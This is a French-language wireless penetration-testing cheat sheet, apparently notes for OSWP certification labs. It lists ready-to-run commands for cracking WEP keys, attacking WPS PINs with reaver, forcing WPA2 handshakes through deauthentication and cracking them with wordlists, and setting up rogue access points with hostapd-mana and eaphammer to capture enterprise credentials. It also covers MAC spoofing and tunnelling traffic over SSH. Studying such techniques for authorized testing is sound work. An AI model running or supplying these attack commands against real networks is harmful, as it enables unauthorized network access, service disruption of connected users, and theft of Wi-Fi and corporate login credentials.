
## OPN WIFI

### Configuration

```ini
network={
  ssid="wifi-guest"
  key_mgmt=NONE
  scan_ssid=1
}
```

### Connexion

```bash
sudo wpa_supplicant -i wlan1 -c guest.conf
sudo dhclient wlan1 -v
```

## WEP

### Injection de paquets et cracking

```bash
sudo aireplay-ng -1 3600 -q 10 -a F0:9F:C2:71:22:11 wlan1mon
sudo aireplay-ng --arpreplay -b F0:9F:C2:71:22:11 -h F0:9F:C2:71:22:11 wlan1mon
sudo aircrack-ng wifi-old-01.cap
```

### Configuration

```ini
network={
  ssid="wifi-old"
  key_mgmt=NONE
  wep_key0=11bb33cd55
  wep_tx_keyidx=0
}
```

## Attaque WPS

```bash
wash -i wlan0mon
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K # Pixie
-p # code pin vide
```

## WPA/WPA2

### Bruteforce Handshake

```bash
sudo airodump-ng wlan1mon --bssid F0:9F:C2:71:22:12 -w wap2.conf
sudo aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon -c 28:6C:07:6F:F9:44
aircrack-ng ~/wpa2.cap -w ~/rockyou-top100000.txt
```

### Usurper un point d'accès + WPA3

```bash
sudo airodump-ng -w discovery --output-format pcap wlan0mon
sudo hostapd-mana Mostar-mana.conf
sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan0mon
```

### Cracking WPA3

```bash
hashcat -a 0 -m 2500 hostapd.hccapx ~/rockyou-top100000.txt --force
hcxhash2cap --hccapx=hostapd.hccapx -c aux.pcap
hcxpcapngtool aux.pcap -o hash.22000
sudo hashcat -a 0 -m 22000 hash.22000 ~/rockyou.txt --force
```

### Connexion WPA/WPA2

```ini
network={
  ssid="wifi-wpa2"
  scan_ssid=1
  psk="PASSWORD"
  key_mgmt=WPA-PSK
}
```

## MGT Entreprise

### Extraction Certificat

```bash
# Wireshark
(wlan.sa == f0:9f:c2:71:22:15) && (tls.handshake.certificate)
# Export packet bytes : .der
openssl x509 -inform der -in cert.der -text
```

```bash
# Tshark
shark -r ~/wifi/scanc44-02.cap -Y "wlan.bssid == f0:9f:c2:71:22:15 && ssl.handshake.type == 11" -V
```

### Rogue AP

```bash
python3 ./eaphammer --cert-wizard
python3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
```

### Deauth

```bash
aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0mon -c 64:32:A8:BA:6C:41
```

### Connexion WPA Entreprise

```ini
network={  
  ssid="wifi-corp"  
  scan_ssid=1  
  key_mgmt=WPA-EAP  
  identity="CONTOSO\\juan.tr"  
  password="PASSWORD"  
  eap=PEAP  
  phase1="peaplabel=0"  
  phase2="auth=MSCHAPV2"  
}
```

```bash
sudo wpa_supplicant -i wlan5 -c mgt.conf
sudo dhclient wlan5
```

## AUTRES

### Modifier MAC

```bash
systemctl stop network-manager
ip link set wlan2 down
macchanger -m b0:72:bf:44:b0:49 wlan2
ip link set wlan2 up
```

### Redirection SSH

```bash
ssh -D 9090 user@192.168.1.68
FoxyProxy : socks5 9090
```

### Capture de trafic réseau

```bash
ssh user@192.168.1.68 "sudo tcpdump -i wlan2 -w -" > capture.pcap
```

### Curl

```bash
curl -L http://example.com
```

### Vérification du pilote

```bash
iw list
```

### Scanner les réseaux WiFi

```bash
iw dev <INTERFACE> scan | grep SSID:
iw dev <INTERFACE> scan | egrep "DS\ Parameter\ set|SSID"
```

## Liens utiles

- [Wireless Pentesting CheatSheet](https://github.com/V0lk3n/WirelessPentesting-CheatSheet)
- [OSWP Playbook](https://zeyadazima.com/notes/oswplaybook/)
- [Emmanuel Solis OSWP](https://www.emmanuelsolis.com/oswp.html)